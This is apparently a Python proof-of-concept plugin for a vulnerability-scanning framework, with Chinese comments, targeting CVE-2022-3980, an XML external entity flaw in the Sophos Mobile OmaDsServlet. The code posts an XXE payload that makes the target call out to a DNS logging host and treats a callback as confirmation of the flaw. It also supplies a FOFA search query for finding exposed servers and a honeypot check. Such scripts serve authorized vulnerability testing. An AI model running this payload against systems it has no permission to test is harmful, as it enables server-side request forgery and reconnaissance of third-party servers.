# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua,get_ceye_dns, verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Sophos Mobile OmaDsServlet XML实体注入(CVE-2022-3980)",  # 漏洞名称
        "VulnID": "CVE-2022-3980",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
            Sophos修复了一个XML外部实体（XEE/XXE）漏洞，该漏洞能够在本地管理的Sophos Mobile上进行SSRF和潜在的代码执行。
            但由于 Sophos Mobile 使用的是JDK 11.0.7，XXE漏洞无法读取多行文件，只能造成SSRF漏洞。
        """,  # 漏洞简要描述

        "fofa-dork": """
            title="Sophos Mobile"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        success, dns_flag = get_ceye_dns()
        if success == False:
            return [False, dns_flag]

        url = self.target + "/servlets/OmaDsServlet"  # url自己按需调整
        data = """<?xml version="1.0"?>
<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://{}/">%asd;%c;]>
<cdl>&rrr;</cdl>""".format(dns_flag)

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            "Content-Type": "application/xml",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True, dns_flag]
            elif flager == False:
                vuln = [False, dns_flag]
            else:
                vuln = [False, flager]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
